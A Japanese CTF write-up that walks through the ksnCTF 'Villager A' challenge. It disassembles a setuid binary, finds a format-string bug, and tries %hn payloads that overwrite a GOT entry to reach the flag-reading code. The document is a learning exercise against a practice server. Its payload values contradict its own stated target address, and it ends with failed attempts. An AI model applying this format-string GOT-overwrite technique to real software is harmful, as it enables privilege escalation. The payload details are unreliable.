<!DOCTYPE html>
<html lang="ja">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>ksnCTF Villager A | Note</title>
    <meta name="generator" content="VuePress 1.8.2">
    <link rel="icon" href="/imgs/icons/icon.png">
    <link rel="manifest" href="/manifest.json">
    <link rel="shortcut icon" href="/imgs/icons/favicon.ico">
    <meta name="description" content="ksnctf villagerA">
    <meta name="theme-color" content="#3eaf7c">
    
    <link rel="preload" href="/assets/css/0.styles.e16f9711.css" as="style"><link rel="preload" href="/assets/js/app.fd83665a.js" as="script"><link rel="preload" href="/assets/js/2.b8499f1b.js" as="script"><link rel="preload" href="/assets/js/83.af84d6f4.js" as="script"><link rel="preload" href="/assets/js/3.31e57b96.js" as="script"><link rel="prefetch" href="/assets/js/10.8733ee4f.js"><link rel="prefetch" href="/assets/js/11.6702460b.js"><link rel="prefetch" href="/assets/js/12.59e3ba93.js"><link rel="prefetch" href="/assets/js/13.21b3155c.js"><link rel="prefetch" href="/assets/js/14.ef13afc6.js"><link rel="prefetch" href="/assets/js/15.ed40269d.js"><link rel="prefetch" href="/assets/js/16.8166e7a5.js"><link rel="prefetch" href="/assets/js/17.33cce054.js"><link rel="prefetch" href="/assets/js/18.5ea8b8bc.js"><link rel="prefetch" href="/assets/js/19.80e6c60e.js"><link rel="prefetch" href="/assets/js/20.0e296bc9.js"><link rel="prefetch" href="/assets/js/21.cc33682b.js"><link rel="prefetch" href="/assets/js/22.f74adf24.js"><link rel="prefetch" href="/assets/js/23.b94c0779.js"><link rel="prefetch" href="/assets/js/24.f73cccb6.js"><link rel="prefetch" href="/assets/js/25.2bc2c161.js"><link rel="prefetch" href="/assets/js/26.edf3d886.js"><link rel="prefetch" href="/assets/js/27.28b6e9d6.js"><link rel="prefetch" href="/assets/js/28.b802d507.js"><link rel="prefetch" href="/assets/js/29.7d7fa834.js"><link rel="prefetch" href="/assets/js/30.7e9ea8d9.js"><link rel="prefetch" href="/assets/js/31.c12ab2ca.js"><link rel="prefetch" href="/assets/js/32.477c0f3c.js"><link rel="prefetch" href="/assets/js/33.315baaed.js"><link rel="prefetch" href="/assets/js/34.d6ea7706.js"><link rel="prefetch" href="/assets/js/35.e14804bb.js"><link rel="prefetch" href="/assets/js/36.3a10fc14.js"><link rel="prefetch" href="/assets/js/37.540b03c2.js"><link rel="prefetch" href="/assets/js/38.9f371b2a.js"><link rel="prefetch" href="/assets/js/39.3f037682.js"><link rel="prefetch" href="/assets/js/4.00d6b6ad.js"><link rel="prefetch" href="/assets/js/40.ca3f59db.js"><link rel="prefetch" href="/assets/js/41.4651bfe2.js"><link rel="prefetch" href="/assets/js/42.caea1831.js"><link rel="prefetch" href="/assets/js/43.d2a1a080.js"><link rel="prefetch" href="/assets/js/44.0b3134c2.js"><link rel="prefetch" href="/assets/js/45.9fc3017a.js"><link rel="prefetch" href="/assets/js/46.8ae11a8d.js"><link rel="prefetch" href="/assets/js/47.cf076206.js"><link rel="prefetch" href="/assets/js/48.c85f5a87.js"><link rel="prefetch" href="/assets/js/49.41bf1d7a.js"><link rel="prefetch" href="/assets/js/5.1d72ad79.js"><link rel="prefetch" href="/assets/js/50.50403c3b.js"><link rel="prefetch" href="/assets/js/51.b02422ea.js"><link rel="prefetch" href="/assets/js/52.bcfcc620.js"><link rel="prefetch" href="/assets/js/53.deaacc0a.js"><link rel="prefetch" href="/assets/js/54.0fbdb36f.js"><link rel="prefetch" href="/assets/js/55.248c5c6d.js"><link rel="prefetch" href="/assets/js/56.e64b9460.js"><link rel="prefetch" href="/assets/js/57.234c0f32.js"><link rel="prefetch" href="/assets/js/58.eedb9d07.js"><link rel="prefetch" href="/assets/js/59.cd3dfc89.js"><link rel="prefetch" href="/assets/js/6.6ec95fbb.js"><link rel="prefetch" href="/assets/js/60.bf43c6f4.js"><link rel="prefetch" href="/assets/js/61.a95410c5.js"><link rel="prefetch" href="/assets/js/62.d6883245.js"><link rel="prefetch" href="/assets/js/63.2c2ffcc3.js"><link rel="prefetch" href="/assets/js/64.7d3700cb.js"><link rel="prefetch" href="/assets/js/65.59fdb28b.js"><link rel="prefetch" href="/assets/js/66.5a7f9c73.js"><link rel="prefetch" href="/assets/js/67.f9e92ebc.js"><link rel="prefetch" href="/assets/js/68.4f005aab.js"><link rel="prefetch" href="/assets/js/69.8fa02d3d.js"><link rel="prefetch" href="/assets/js/7.0b1e9a07.js"><link rel="prefetch" href="/assets/js/70.1933b652.js"><link rel="prefetch" href="/assets/js/71.17a8ef26.js"><link rel="prefetch" href="/assets/js/72.f874bcd2.js"><link rel="prefetch" href="/assets/js/73.f534554b.js"><link rel="prefetch" href="/assets/js/74.ebda6bc5.js"><link rel="prefetch" href="/assets/js/75.ecc0ca7f.js"><link rel="prefetch" href="/assets/js/76.424d3840.js"><link rel="prefetch" href="/assets/js/77.6b59075d.js"><link rel="prefetch" href="/assets/js/78.0ceea546.js"><link rel="prefetch" href="/assets/js/79.0c989041.js"><link rel="prefetch" href="/assets/js/8.7d241289.js"><link rel="prefetch" href="/assets/js/80.f3e20fd6.js"><link rel="prefetch" href="/assets/js/81.c2100f5e.js"><link rel="prefetch" href="/assets/js/82.6e7574a0.js"><link rel="prefetch" href="/assets/js/84.47e724cd.js"><link rel="prefetch" href="/assets/js/85.741aee96.js"><link rel="prefetch" href="/assets/js/86.91836f2b.js"><link rel="prefetch" href="/assets/js/87.7b94e377.js"><link rel="prefetch" href="/assets/js/88.a3490bcb.js"><link rel="prefetch" href="/assets/js/9.aaae0c1c.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e16f9711.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Note</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/#links" class="nav-link">Links</a></div><div class="nav-item"><a href="/tags/" class="nav-link">Articles</a></div><div class="nav-item"><a href="/chukapi_fun_art.html" class="nav-link">Chukapi-Fun-Art</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/#links" class="nav-link">Links</a></div><div class="nav-item"><a href="/tags/" class="nav-link">Articles</a></div><div class="nav-item"><a href="/chukapi_fun_art.html" class="nav-link">Chukapi-Fun-Art</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>ksnCTF Villager A</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/article/villager_a.html#攻撃のまとめ" class="sidebar-link">攻撃のまとめ</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="ksnctf-villager-a"><a href="#ksnctf-villager-a" class="header-anchor">#</a> ksnCTF Villager A</h1> <ul><li>sshで接続してみる</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">ssh</span> -p <span class="token number">10022</span> q4@ctfq.sweetduet.info
q4@ctfq.sweetduet.info's password: 
Last login: Wed Mar <span class="token number">13</span> <span class="token number">13</span>:43:28 <span class="token number">2019</span> from <span class="token number">10.0</span>.2.2
<span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ <span class="token function">ls</span> -l
total <span class="token number">16</span>
-r--------. <span class="token number">1</span> q4a  q4a    <span class="token number">22</span>  <span class="token number">5</span>月 <span class="token number">22</span> 02:12 <span class="token number">2012</span> flag.txt
-rwsr-xr-x. <span class="token number">1</span> q4a  q4a  <span class="token number">5857</span>  <span class="token number">5</span>月 <span class="token number">22</span> <span class="token number">11</span>:21 <span class="token number">2012</span> q4
-rw-r--r--. <span class="token number">1</span> root root  <span class="token number">151</span>  <span class="token number">6</span>月  <span class="token number">1</span> 04:47 <span class="token number">2012</span> readme.txt
</code></pre></div><ul><li>flag.txtというファイルがあるので開きたい</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> flag.txt 
cat: flag.txt: Permission denied
<span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ <span class="token function">chmod</span> <span class="token number">755</span> flag.txt 
chmod: changing permissions of `flag.txt': Operation not permitted
<span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ <span class="token function">whoami</span>
q4
</code></pre></div><ul><li><code>permission denied</code>らしい</li> <li>当然<code>chmod</code>も使えない</li> <li>自分の名前は<code>q4</code>なので, <code>q4a</code>は使えない</li> <li>q4というファイルのパーミッションは<code>-rwsr-xr-x</code>なので, <code>q4a</code>と異なるグループに属しているユーザでも実行はできそう</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ ./q4
What's your name?
q4
Hi, q4

Do you want the flag?
<span class="token function">yes</span>
Do you want the flag?
<span class="token boolean">true</span>
Do you want the flag?
<span class="token function">yes</span>
Do you want the flag?
no
I see. Good bye.
</code></pre></div><ul><li>noを言うまで問うのをやめてくれない</li> <li><code>objdump</code>で確認する</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code>$ objdump -d -M intel ./q4
~~ 略 ~~~
080485b4 <span class="token operator">&lt;</span>main<span class="token operator">&gt;</span>:
 80485b4:       <span class="token number">55</span>                      push   ebp
 80485b5:       <span class="token number">89</span> e5                   mov    ebp,esp
 80485b7:       <span class="token number">83</span> e4 f0                and    esp,0xfffffff0
 80485ba:       <span class="token number">81</span> ec <span class="token number">20</span> 04 00 00       sub    esp,0x420
 80485c0:       c7 04 <span class="token number">24</span> a4 <span class="token number">87</span> 04 08    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x80487a4
 80485c7:       e8 f8 fe ff ff          call   80484c4 <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
 80485cc:       a1 04 9a 04 08          mov    eax,ds:0x8049a04
 80485d1:       <span class="token number">89</span> <span class="token number">44</span> <span class="token number">24</span> 08             mov    DWORD PTR <span class="token punctuation">[</span>esp+0x8<span class="token punctuation">]</span>,eax
 80485d5:       c7 <span class="token number">44</span> <span class="token number">24</span> 04 00 04 00    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x400
 80485dc:       00 
 80485dd:       8d <span class="token number">44</span> <span class="token number">24</span> <span class="token number">18</span>             lea    eax,<span class="token punctuation">[</span>esp+0x18<span class="token punctuation">]</span>
 80485e1:       <span class="token number">89</span> 04 <span class="token number">24</span>                mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
 80485e4:       e8 9b fe ff ff          call   <span class="token number">8048484</span> <span class="token operator">&lt;</span>fgets@plt<span class="token operator">&gt;</span>
 80485e9:       c7 04 <span class="token number">24</span> b6 <span class="token number">87</span> 04 08    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x80487b6
 80485f0:       e8 bf fe ff ff          call   80484b4 <span class="token operator">&lt;</span>printf@plt<span class="token operator">&gt;</span>
 80485f5:       8d <span class="token number">44</span> <span class="token number">24</span> <span class="token number">18</span>             lea    eax,<span class="token punctuation">[</span>esp+0x18<span class="token punctuation">]</span>
 80485f9:       <span class="token number">89</span> 04 <span class="token number">24</span>                mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
 80485fc:       e8 b3 fe ff ff          call   80484b4 <span class="token operator">&lt;</span>printf@plt<span class="token operator">&gt;</span>
 <span class="token number">8048601</span>:       c7 04 <span class="token number">24</span> 0a 00 00 00    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0xa
 <span class="token number">8048608</span>:       e8 <span class="token number">67</span> fe ff ff          call   <span class="token number">8048474</span> <span class="token operator">&lt;</span>putchar@plt<span class="token operator">&gt;</span>
 804860d:       c7 <span class="token number">84</span> <span class="token number">24</span> <span class="token number">18</span> 04 00 00    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x418<span class="token punctuation">]</span>,0x1
 <span class="token number">8048614</span>:       01 00 00 00 
 <span class="token number">8048618</span>:       eb <span class="token number">67</span>                   jmp    <span class="token number">8048681</span> <span class="token operator">&lt;</span>main+0xcd<span class="token operator">&gt;</span>
 804861a:       c7 04 <span class="token number">24</span> bb <span class="token number">87</span> 04 08    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x80487bb
 <span class="token number">8048621</span>:       e8 9e fe ff ff          call   80484c4 <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
 <span class="token number">8048626</span>:       a1 04 9a 04 08          mov    eax,ds:0x8049a04
 804862b:       <span class="token number">89</span> <span class="token number">44</span> <span class="token number">24</span> 08             mov    DWORD PTR <span class="token punctuation">[</span>esp+0x8<span class="token punctuation">]</span>,eax
 804862f:       c7 <span class="token number">44</span> <span class="token number">24</span> 04 00 04 00    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x400
 <span class="token number">8048636</span>:       00 
 <span class="token number">8048637</span>:       8d <span class="token number">44</span> <span class="token number">24</span> <span class="token number">18</span>             lea    eax,<span class="token punctuation">[</span>esp+0x18<span class="token punctuation">]</span>
 804863b:       <span class="token number">89</span> 04 <span class="token number">24</span>                mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
 804863e:       e8 <span class="token number">41</span> fe ff ff          call   <span class="token number">8048484</span> <span class="token operator">&lt;</span>fgets@plt<span class="token operator">&gt;</span>
 <span class="token number">8048643</span>:       <span class="token number">85</span> c0                   <span class="token builtin class-name">test</span>   eax,eax
 <span class="token number">8048645</span>:       0f <span class="token number">94</span> c0                sete   al
 <span class="token number">8048648</span>:       <span class="token number">84</span> c0                   <span class="token builtin class-name">test</span>   al,al
 804864a:       <span class="token number">74</span> 0a                   je     <span class="token number">8048656</span> <span class="token operator">&lt;</span>main+0xa<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>
 804864c:       b8 00 00 00 00          mov    eax,0x0
 <span class="token number">8048651</span>:       e9 <span class="token number">86</span> 00 00 00          jmp    80486dc <span class="token operator">&lt;</span>main+0x12<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>
 <span class="token number">8048656</span>:       c7 <span class="token number">44</span> <span class="token number">24</span> 04 d1 <span class="token number">87</span> 04    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x80487d1
 804865d:       08 
 804865e:       8d <span class="token number">44</span> <span class="token number">24</span> <span class="token number">18</span>             lea    eax,<span class="token punctuation">[</span>esp+0x18<span class="token punctuation">]</span>
 <span class="token number">8048662</span>:       <span class="token number">89</span> 04 <span class="token number">24</span>                mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
 <span class="token number">8048665</span>:       e8 7a fe ff ff          call   80484e4 <span class="token operator">&lt;</span>strcmp@plt<span class="token operator">&gt;</span>
 804866a:       <span class="token number">85</span> c0                   <span class="token builtin class-name">test</span>   eax,eax
 804866c:       <span class="token number">75</span> <span class="token number">13</span>                   jne    <span class="token number">8048681</span> <span class="token operator">&lt;</span>main+0xcd<span class="token operator">&gt;</span>
 804866e:       c7 04 <span class="token number">24</span> d5 <span class="token number">87</span> 04 08    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x80487d5
 <span class="token number">8048675</span>:       e8 4a fe ff ff          call   80484c4 <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
 804867a:       b8 00 00 00 00          mov    eax,0x0
 804867f:       eb 5b                   jmp    80486dc <span class="token operator">&lt;</span>main+0x12<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>
 <span class="token number">8048681</span>:       8b <span class="token number">84</span> <span class="token number">24</span> <span class="token number">18</span> 04 00 00    mov    eax,DWORD PTR <span class="token punctuation">[</span>esp+0x418<span class="token punctuation">]</span>
 <span class="token number">8048688</span>:       <span class="token number">85</span> c0                   <span class="token builtin class-name">test</span>   eax,eax
 804868a:       0f <span class="token number">95</span> c0                setne  al
 804868d:       <span class="token number">84</span> c0                   <span class="token builtin class-name">test</span>   al,al
 804868f:       <span class="token number">75</span> <span class="token number">89</span>                   jne    804861a <span class="token operator">&lt;</span>main+0x6<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>
 <span class="token number">8048691</span>:       c7 <span class="token number">44</span> <span class="token number">24</span> 04 e6 <span class="token number">87</span> 04    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x80487e6
 <span class="token number">8048698</span>:       08 
 <span class="token number">8048699</span>:       c7 04 <span class="token number">24</span> e8 <span class="token number">87</span> 04 08    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x80487e8
 80486a0:       e8 ff fd ff ff          call   80484a4 <span class="token operator">&lt;</span>fopen@plt<span class="token operator">&gt;</span>
 80486a5:       <span class="token number">89</span> <span class="token number">84</span> <span class="token number">24</span> 1c 04 00 00    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x41c<span class="token punctuation">]</span>,eax
 80486ac:       8b <span class="token number">84</span> <span class="token number">24</span> 1c 04 00 00    mov    eax,DWORD PTR <span class="token punctuation">[</span>esp+0x41c<span class="token punctuation">]</span>
 80486b3:       <span class="token number">89</span> <span class="token number">44</span> <span class="token number">24</span> 08             mov    DWORD PTR <span class="token punctuation">[</span>esp+0x8<span class="token punctuation">]</span>,eax
 80486b7:       c7 <span class="token number">44</span> <span class="token number">24</span> 04 00 04 00    mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x400
 80486be:       00 
 80486bf:       8d <span class="token number">44</span> <span class="token number">24</span> <span class="token number">18</span>             lea    eax,<span class="token punctuation">[</span>esp+0x18<span class="token punctuation">]</span>
 80486c3:       <span class="token number">89</span> 04 <span class="token number">24</span>                mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
 80486c6:       e8 b9 fd ff ff          call   <span class="token number">8048484</span> <span class="token operator">&lt;</span>fgets@plt<span class="token operator">&gt;</span>
 80486cb:       8d <span class="token number">44</span> <span class="token number">24</span> <span class="token number">18</span>             lea    eax,<span class="token punctuation">[</span>esp+0x18<span class="token punctuation">]</span>
 80486cf:       <span class="token number">89</span> 04 <span class="token number">24</span>                mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
 80486d2:       e8 <span class="token function">dd</span> fd ff ff          call   80484b4 <span class="token operator">&lt;</span>printf@plt<span class="token operator">&gt;</span>
 80486d7:       b8 00 00 00 00          mov    eax,0x0
 80486dc:       c9                      leave  
 80486dd:       c3                      ret    
 80486de:       <span class="token number">90</span>                      nop
 80486df:       <span class="token number">90</span>                      nop
~~ 略 ~~~

</code></pre></div><ul><li>出力より, 次のようにmainが実行されていることがわかる
<ul><li>puts</li> <li>fgets</li> <li>printf</li> <li>printf</li> <li>putchar</li> <li>fopen</li> <li>puts</li></ul></li> <li>fgetsを使用しているのでbofかformat stringを狙える気がする</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ ./q4
What<span class="token string">'s your name?
AAAAAAAAAAAAAAAAAAAAAa
Hi, AAAAAAAAAAAAAAAAAAAAAa

Do you want the flag?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Do you want the flag?
^C
[q4@localhost ~]$ ./q4
What'</span>s your name?
AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
Hi, AAAA,0x400,0x9258c0,0x8,0x14,0xc84fc4,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025
</code></pre></div><ul><li>format stringで行けそう!</li> <li>引数は6個目</li> <li>6個目にsystem関数の実行番地を仕込んで実行すれば<code>/bin/sh</code>を実行できるか?</li> <li>できなさそう(system関数の番地がわからない)</li> <li>使えそうな関数を探す</li> <li></li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ objdump -d -M intel -j .plt ./q4 

./q4:     <span class="token function">file</span> <span class="token function">format</span> elf32-i386


Disassembly of section .plt:

08048454 <span class="token operator">&lt;</span>__gmon_start__@plt-0x1<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>:
<span class="token number">8048454</span>:       ff <span class="token number">35</span> d4 <span class="token number">99</span> 04 08       push   DWORD PTR ds:0x80499d4
804845a:       ff <span class="token number">25</span> d8 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499d8
<span class="token number">8048460</span>:       00 00                   <span class="token function">add</span>    BYTE PTR <span class="token punctuation">[</span>eax<span class="token punctuation">]</span>,al
<span class="token punctuation">..</span>.

08048464 <span class="token operator">&lt;</span>__gmon_start__@plt<span class="token operator">&gt;</span>:
<span class="token number">8048464</span>:       ff <span class="token number">25</span> <span class="token function">dc</span> <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499dc
804846a:       <span class="token number">68</span> 00 00 00 00          push   0x0
804846f:       e9 e0 ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>

08048474 <span class="token operator">&lt;</span>putchar@plt<span class="token operator">&gt;</span>:
<span class="token number">8048474</span>:       ff <span class="token number">25</span> e0 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499e0
804847a:       <span class="token number">68</span> 08 00 00 00          push   0x8
804847f:       e9 d0 ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>

08048484 <span class="token operator">&lt;</span>fgets@plt<span class="token operator">&gt;</span>:
<span class="token number">8048484</span>:       ff <span class="token number">25</span> e4 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499e4
804848a:       <span class="token number">68</span> <span class="token number">10</span> 00 00 00          push   0x10
804848f:       e9 c0 ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>

08048494 <span class="token operator">&lt;</span>__libc_start_main@plt<span class="token operator">&gt;</span>:
<span class="token number">8048494</span>:       ff <span class="token number">25</span> e8 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499e8
804849a:       <span class="token number">68</span> <span class="token number">18</span> 00 00 00          push   0x18
804849f:       e9 b0 ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>

080484a4 <span class="token operator">&lt;</span>fopen@plt<span class="token operator">&gt;</span>:
80484a4:       ff <span class="token number">25</span> ec <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499ec
80484aa:       <span class="token number">68</span> <span class="token number">20</span> 00 00 00          push   0x20
80484af:       e9 a0 ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>

080484b4 <span class="token operator">&lt;</span>printf@plt<span class="token operator">&gt;</span>:
80484b4:       ff <span class="token number">25</span> f0 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499f0
80484ba:       <span class="token number">68</span> <span class="token number">28</span> 00 00 00          push   0x28
80484bf:       e9 <span class="token number">90</span> ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>

080484c4 <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>:
80484c4:       ff <span class="token number">25</span> f4 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499f4
80484ca:       <span class="token number">68</span> <span class="token number">30</span> 00 00 00          push   0x30
80484cf:       e9 <span class="token number">80</span> ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>

080484d4 <span class="token operator">&lt;</span>__gxx_personality_v0@plt<span class="token operator">&gt;</span>:
80484d4:       ff <span class="token number">25</span> f8 <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499f8
80484da:       <span class="token number">68</span> <span class="token number">38</span> 00 00 00          push   0x38
80484df:       e9 <span class="token number">70</span> ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>

080484e4 <span class="token operator">&lt;</span>strcmp@plt<span class="token operator">&gt;</span>:
80484e4:       ff <span class="token number">25</span> fc <span class="token number">99</span> 04 08       jmp    DWORD PTR ds:0x80499fc
80484ea:       <span class="token number">68</span> <span class="token number">40</span> 00 00 00          push   0x40
80484ef:       e9 <span class="token number">60</span> ff ff ff          jmp    <span class="token number">8048454</span> <span class="token operator">&lt;</span>_init+0x3<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>
</code></pre></div><ul><li>fopen関数が使えるのでは?</li> <li>先ほどのmain関数を見返してみると, fopenしてくれている部分がある</li> <li>このfopenをprintfとかputsとかから参照してやれば良さそう?</li> <li>fgetsで入力文字列の上書きをするので, fgetsの後のprintfをcallする関数を上書きしてみる</li></ul> <h2 id="攻撃のまとめ"><a href="#攻撃のまとめ" class="header-anchor">#</a> 攻撃のまとめ</h2> <ul><li>fopen関数の番地は, <code>0x080484a4</code></li> <li>printf関数の番地は, <code>0x080484b4</code></li> <li>printf関数内で呼び出しているのは, <code>0x080499f0</code>なので, これを<code>0x080486a0</code>に上書きする</li></ul> <table><thead><tr><th style="text-align:center;">入力アドレス</th> <th style="text-align:center;">出力バイト数</th> <th style="text-align:center;">総出力バイト数</th> <th style="text-align:center;">補足</th></tr></thead> <tbody><tr><td style="text-align:center;">0x080499f0</td> <td style="text-align:center;">4</td> <td style="text-align:center;">4</td> <td style="text-align:center;">4バイトずつ攻撃</td></tr> <tr><td style="text-align:center;">0x080499f2</td> <td style="text-align:center;">4</td> <td style="text-align:center;">8</td> <td style="text-align:center;">''</td></tr> <tr><td style="text-align:center;">%39400x</td> <td style="text-align:center;">39400</td> <td style="text-align:center;">39408</td> <td style="text-align:center;">39408(0x99f0)-8=39400</td></tr> <tr><td style="text-align:center;">%6$n</td> <td style="text-align:center;">0</td> <td style="text-align:center;">39408</td> <td style="text-align:center;">引数は6個目から</td></tr> <tr><td style="text-align:center;">%28180x</td> <td style="text-align:center;">28180</td> <td style="text-align:center;">67588</td> <td style="text-align:center;">67588(0x0804)-39408=28180</td></tr> <tr><td style="text-align:center;">%7$n</td> <td style="text-align:center;">0</td> <td style="text-align:center;">67588</td> <td style="text-align:center;">次は7個目</td></tr></tbody></table> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> -e <span class="token string">'\xf0\x99\x04\x08\xf2\x99\x04\x08%39400x%6$hn%28180x%7$hn'</span> <span class="token operator">|</span> ./q4
</code></pre></div><ul><li>通らない</li> <li>printf(0x80499f0)の代わりにputchar(0x80499e0)を使ってみる</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> -e <span class="token string">'\xe0\x99\x04\x08\xe2\x99\x04\x08%39400x%6$hn%28180x%7$hn'</span> <span class="token operator">|</span> ./q4
~~ 略 ~~~
Segmentation Fault
~~ 略 ~~~
</code></pre></div><ul><li>gdbで原因を探る</li></ul> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>q4@localhost ~<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> -e <span class="token string">'r\n\xe0\x99\x04\x08\xe2\x99\x04\x08%39400x%6$hn%28180x%7$hn'</span> <span class="token operator">|</span> gdb -q ./q4
Reading symbols from /home/q4/q4<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> Hangup detected on fd <span class="token number">0</span>
error detected on stdin
</code></pre></div><ul><li>パイプでバグって正しい結果が出力できていないらしい
